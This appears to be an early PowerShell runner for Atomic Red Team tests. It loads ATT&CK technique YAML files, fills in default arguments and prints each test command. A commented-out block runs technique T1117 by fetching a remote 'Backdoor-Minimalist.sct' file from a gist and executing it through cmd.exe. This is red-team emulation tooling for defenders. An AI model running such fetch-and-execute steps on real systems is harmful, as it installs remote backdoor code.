# Invoke-AtomicTests
# Notes and Setup
# Requirements Windows 10, and PowerShell-Yaml
# Admin Rights
# Caveat... We make no effort to clean up the tests artifacts. we probably should lol

<#
TODO:
Fix Quotations
Verbs


#>


#Define Script Param for SupportedPlatforms
$SupportedPlatforms = 'windows'


#Ascii Art 

$AtomicAsciiArt = @'

     ___    __                  _         ____           __   ______
    /   | / /_____  ____ ___  (_)____   / __ \___  ____/ /  /_  __/__  ____ _____ ___
   / /| |/ __/ __ \/ __ `__ \/ / ___/  / /_/ / _ \/ __  /    / / / _ \/ __ `/ __ `__ \
  / ___ / /_/ /_/ / / / / / / / /__   / _, _/  __/ /_/ /    / / /  __/ /_/ / / / / / /
 /_/  |_\__/\____/_/ /_/ /_/_/\___/  /_/ |_|\___/\__,_/    /_/  \___/\__,_/_/ /_/ /_/
                                                                                    


'@

# Scripted & Interactive 

Write-Host $AtomicAsciiArt -Foreground Green

# Loop Over All Files, Convert Each to Variable Name Of the Test.

$AtomicFilePath = 'C:\Users\subtee\downloads\atomic-red-team-master\atomics\' #Input Parameter Defined in beginning of script.

function Set-AtomicVariables([string] $AtomicFilePath)
{
	#All or Just One?  Modify this to accept one, some, or all tests
	
	Get-Childitem $AtomicFilePath -Recurse -Filter *.yaml -File | ForEach-Object {
	#Get-ChildItem -Path $AtomicFilePath -Filter *.yaml -Recurse -File -Name | ForEach-Object {
		try
		{
			$currentTechnique = [System.IO.Path]::GetFileNameWithoutExtension($_.FullName);
			New-Variable -Name $currentTechnique -Value (ConvertFrom-Yaml (Get-Content $_.FullName -Raw )) -Scope "Script";
		}
		catch
		{
			#Add some putput if desired like Write-Verbose...
		}
		
	}

}

Set-AtomicVariables([string] $AtomicFilePath) #Sets Up variables, Adjust Method to be one, some, or all...

$AtomicTechniqueVariableArray = (Get-Variable T1*)
#$AtomicTechniqueVariableArray.Count #Debug Count Check

#Extracts Technique Object
$AllAtomicTechniques =  $AtomicTechniqueVariableArray |  %{ $_.Value } 

<# Debug Counts Output

$AllAtomicWindowsTechniques.Count 
$AllAtomicWindowsTests = $AllAtomicWindowsTechniques.atomic_tests 
$AllAtomicWindowsTests.Count

#>


<#	
# Parse and execute a specific test.
# T1117
Write-Host $T1117.display_name.ToString(), $T1117.attack_technique.ToString() "has " $T1117.atomic_tests.Count "tests"  -Foreground Yellow 
Write-Host "Executing Test 1" -Foreground Green
$thingtoexec = $T1117.atomic_tests[1].executor.command | %{ $_.replace('#{url}', 'https://gist.githubusercontent.com/caseysmithrc/7035ee694e9f1ced26654fa825aa193a/raw/8ff906fe8053b965ba517bb84c1488744e51843e/Backdoor-Minimalist.sct')}
#Things to replace could come from a config file etc...
#Is replace best or... Set a "value" property explicitly

& cmd.exe /c $thingtoexec 
#>

#Now Loop Over Each Test 

#Takes $AtomicTechnique Parsed From YAML and Executes it with Default Values
function ExecuteAtomicTechnique([System.Collections.Hashtable] $AtomicTechnique)
{
	#Designed to Run ALL Tests For A Technique
	#Print Test Name, and Description, and Count of Tests
	Write-Host '[********BEGIN TEST*******]' $AtomicTechnique.display_name.ToString(), $AtomicTechnique.attack_technique.ToString() "has" $AtomicTechnique.atomic_tests.Count "Test(s)"  -Foreground Yellow 
	#Call ExecuteAtomicTest
	$AtomicTechnique.atomic_tests | %{ ExecuteAtomicTest $_ }
	Write-Host "[!!!!!!!!END TEST!!!!!!!]`n"
	
	
}

#PowerShellize these names and verbs.
#Make them pipeline aware and all that

function ExecuteAtomicTest([System.Collections.Hashtable] $AtomicTest)
{
	#Short Circuit Exit On Conditions
	#For Now We Only care about Windows Tests
	#if ( !($AtomicTest.supported_platforms.Contains($SupportedPlatforms)) ) 	{ return }
	#Reject Manual Tests
	if ( ($AtomicTest.executor.name.Contains('manual')) ) 	{ return }
	
	#Designed to Run An Individual Test  
	#Debug Writes
	Write-Host $AtomicTest.name.ToString()
	Write-Host $AtomicTest.description.ToString()
	
	$finalCommand = $AtomicTest.executor.command
	#Write-Host $AtomicTest.supported_platforms
	#Put the Check Here for SupportedPlatforms var before execution.
	#Write-Host $AtomicTest.executor.name
	
	#Convert Executor to actual command , 
	
	#Write-Host $AtomicTest.executor.command -Foreground Green
	#Check for input_arguments... For each input_arguments.
	#Find that argument and replace it in the command string.
	
	
	
	
	if($AtomicTest.input_arguments.Count -gt 0)
	{
		#This Can Be An Array In Some Tests
		#This is crazy, nested HashTable VooDoo
		$InputArgs = [Array]($AtomicTest.input_arguments.Keys).Split(" ")
		$InputDefaults = [Array]( $AtomicTest.input_arguments.Values | %{$_.default }).Split(" ")
		
		 
		
		for($i = 0; $i -lt $InputArgs.Length; $i++)
		{	
			$findValue = '#{' + $InputArgs[$i] + '}'
			$finalCommand = $finalCommand.Replace( $findValue, $InputDefaults[$i] )
		}
		
		Write-Host $finalCommand -Foreground Green
		
	}
	else
	{
		#Just produce command
		Write-Host $finalCommand -Foreground Green
		
	}
	
	
}


$AllAtomicTechniques | %{ ExecuteAtomicTechnique($_) }




$PowerShellBoom = @'
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
'@


 
 
Write-Host $PowerShellBoom -Foreground Yellow
Write-Host "Test Complete, Go Sift Through The Fallout" -Foreground Cyan




